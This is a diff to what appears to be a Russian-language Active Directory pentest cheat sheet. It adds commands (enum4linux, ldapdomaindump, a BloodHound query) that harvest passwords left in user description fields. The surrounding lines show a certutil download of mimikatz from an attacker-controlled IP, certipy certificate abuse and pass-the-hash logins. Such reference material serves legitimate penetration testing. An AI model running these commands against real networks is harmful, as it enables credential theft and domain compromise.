@@ -287,6 +287,7 @@ certutil -urlcache -split -f http://10.10.14.16/mimikatz.exe C:\Windows\System32
 - SamAccountNameSpoofing
 - PrinterNightmare
 - Password Spraying
+- Поиск пароля в описании пользователей
 
 **Энумерация сессий** 
 Инструменты: PowerView, RSAT, ADExplorer, LdapAdmin, **DExplorer, Bloodhound, ADRecon**
@@ -393,6 +394,14 @@ certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target 
 certipy auth -pfx administrator_dc.pfx -dc-ip 172.16.126.128
 evil-winrm -i <IP> -u <User> -H <NThash> || crackmapexec smb <IP> -u <User> -H <NTLM>
 
+```
+
+**Поиск пароля в описании пользователей**
+
+```
+enum4linux -u <victim_user> -p <victim_pass> -U <victim_ip>
+ldapdomaindump -u .\\<victim_user> -p <victim_pass> <victim_ip> -o result
+bloodhound (neo4j): MATCH (u:User) WHERE not u.description CONTAINS "Built-in" return u.name, u.displayname, u.description, u.group
 ```
 
 **SMB**
